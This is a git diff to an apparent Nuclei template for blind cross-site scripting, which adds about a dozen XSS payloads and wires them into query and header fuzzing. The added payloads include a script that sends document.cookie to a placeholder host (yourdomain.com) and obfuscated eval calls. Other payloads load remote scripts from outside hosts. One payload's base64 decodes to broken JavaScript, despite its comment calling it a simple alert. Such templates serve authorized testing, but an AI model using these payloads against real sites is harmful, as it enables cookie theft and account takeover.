@@ -4,7 +4,9 @@ info:
   name: Blind Cross Site Scripting
   author: 0xKayala (Satya Prakash)
   severity: high
-  description: This template will spray blind XSS payloads into URLs. Use 'xss.report', 'bxsshunter.com', 'xsshunter.trufflesecurity.com', 'ez.pe' or 'self-hosted server' to check if the payload fired.
+  description: >
+    This template will spray blind XSS payloads into URLs. Use 'xss.report', 'bxsshunter.com', 'xsshunter.trufflesecurity.com',
+    'ez.pe' or 'self-hosted server' to check if the payload fired.
   tags: xss, blind-xss, dast, bxss, generic
 
 variables:
@@ -17,7 +19,18 @@ variables:
   script_payload_6: "<script src=//satya.ez.pe></script>"
   script_payload_7: "\u0022\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e"
   script_payload_8: "%3Cdiv%20id%3D%22load%22%3E%3C%2Fdiv%3E%3Cscript%3Evar%20i%20%3D%20document.createElement%28%27iframe%27%29%3B%20i.style.display%20%3D%20%27none%27%3B%20i.onload%20%3D%20function%28%29%20%7B%20i.contentWindow.location.href%20%3D%20%27%2F%2F0xkayala.github.io/xss-poc.js%27%3B%20%7D%3B%20document.getElementById%28%27load%27%29.appendChild%28i%29%3B%3C%2Fscript%3E"
-  script_payload_9: "XX"></SCRIPT><embed src=//14.rs>"
+  script_payload_9: "XX\"></SCRIPT><embed src=//14.rs>"
+  script_payload_10: "<svg/onload=alert('blind-xss')>"
+  script_payload_11: "<img src=x onerror=eval(atob('ZG9jdW1lbnQuZG9tYWlu'))>"
+  script_payload_12: "<img src=x onerror=alert(1) />"
+  script_payload_13: "<script>alert('{{first}}');</script>"
+  script_payload_14: "<script src='data:text/javascript;base64,dmFyIHggPSBhbGVydCgnYmluZyB4eD4nKT4=;'></script>"  # Base64 encoded simple alert
+  script_payload_15: "<script>alert('XSS')</script>"
+  script_payload_16: "<img src='x' onerror='eval(String.fromCharCode(97,108,101,114,116,40,39,66,108,105,110,100,32,88,83,83,39,41) )'>"
+  script_payload_17: "<iframe src='javascript:alert(1)' style='display:none'></iframe>"
+  script_payload_18: "<svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))>"
+  script_payload_19: "<script>document.write('<img src=x onerror=alert(1)>');</script>"
+  script_payload_20: "<script>document.location='https://yourdomain.com?cookie='+document.cookie</script>"
 
 http:
   - method: GET
@@ -35,6 +48,17 @@ http:
         - "{{script_payload_7}}"
         - "{{script_payload_8}}"
         - "{{script_payload_9}}"
+        - "{{script_payload_10}}"
+        - "{{script_payload_11}}"
+        - "{{script_payload_12}}"
+        - "{{script_payload_13}}"
+        - "{{script_payload_14}}"
+        - "{{script_payload_15}}"
+        - "{{script_payload_16}}"
+        - "{{script_payload_17}}"
+        - "{{script_payload_18}}"
+        - "{{script_payload_19}}"
+        - "{{script_payload_20}}"
 
     fuzzing:
       - part: query
@@ -58,6 +82,17 @@ http:
           - "{{script_payload_7}}"
           - "{{script_payload_8}}"
           - "{{script_payload_9}}"
+          - "{{script_payload_10}}"
+          - "{{script_payload_11}}"
+          - "{{script_payload_12}}"
+          - "{{script_payload_13}}"
+          - "{{script_payload_14}}"
+          - "{{script_payload_15}}"
+          - "{{script_payload_16}}"
+          - "{{script_payload_17}}"
+          - "{{script_payload_18}}"
+          - "{{script_payload_19}}"
+          - "{{script_payload_20}}"
       - type: word
         part: header
         words:
